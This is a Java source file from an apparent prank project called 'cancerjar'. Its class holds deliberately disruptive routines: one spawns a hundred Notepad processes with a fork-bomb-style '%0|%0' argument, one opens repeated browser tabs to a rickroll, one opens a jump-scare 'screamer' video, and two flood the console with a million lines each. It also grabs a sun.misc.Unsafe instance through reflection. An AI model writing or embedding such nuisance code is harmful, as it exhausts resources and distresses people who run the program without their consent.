/*
    Copyright 2017-present WeirdDogDev

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
 */
package tv.circuitrcay.cancerjar;


import sun.misc.Unsafe;

import java.io.IOException;
import java.lang.reflect.Constructor;


public class CancerShit {
    public static Unsafe createUnsafe() throws Exception {
        Constructor<Unsafe> ctor = Unsafe.class.getDeclaredConstructor();
        ctor.setAccessible(true);
        return ctor.newInstance();
    }
    public static void spamSucc() {
        for(int i=0; i<1000000; i++) {
            System.out.println("FREE SUCC!!!");
        }
    }
    public static void notepad() throws IOException {
        Runtime runtime = Runtime.getRuntime();
        for(int i=0; i<100; i++) {
            Process process = runtime.exec("notepad %0|%0");
        }
    }
    public static void rickroll() throws IOException{
        Runtime runtime = Runtime.getRuntime();
        for(int i=0; i<10; i++) {
            Process process = runtime.exec("chrome https://www.youtube.com/watch?v=oHg5SJYRHA0");
        }
    }
    public static void goodshit() {
        System.out.println("\uD83D\uDC4C\uD83D\uDC40\uD83D\uDC4C\uD83D\uDC40\uD83D\uDC4C\uD83D\uDC40\uD83D\uDC4C\uD83D\uDC40\uD83D\uDC4C\uD83D\uDC40 good shit go౦ԁ sHit\uD83D\uDC4C thats ✔ some good\uD83D\uDC4C\uD83D\uDC4Cshit right\uD83D\uDC4C\uD83D\uDC4Cthere\uD83D\uDC4C\uD83D\uDC4C\uD83D\uDC4C right✔there ✔✔if i do ƽaү so my self \uD83D\uDCAF i say so \uD83D\uDCAF thats what im talking about right there right there (chorus: ʳᶦᵍʰᵗ ᵗʰᵉʳᵉ) mMMMMᎷМ\uD83D\uDCAF \uD83D\uDC4C\uD83D\uDC4C \uD83D\uDC4CНO0ОଠOOOOOОଠଠOoooᵒᵒᵒᵒᵒᵒᵒᵒᵒ\uD83D\uDC4C \uD83D\uDC4C\uD83D\uDC4C \uD83D\uDC4C \uD83D\uDCAF \uD83D\uDC4C \uD83D\uDC40 \uD83D\uDC40 \uD83D\uDC40 \uD83D\uDC4C\uD83D\uDC4CGood shit");
    }

    public static void screamer() throws IOException {
        Runtime runtime = Runtime.getRuntime();
        Process process = runtime.exec("chrome http://dvorak.org/blog/images/GhostlyCarAd.wmv");
    }
    
    //Added by Memes#2545
    public static void descripton() {
        for(int i=0; i<1000000; i++) {
            System.out.println("THIS IS THE MOST CANCEROUS JAR EVER!");
        }
    }
    
}
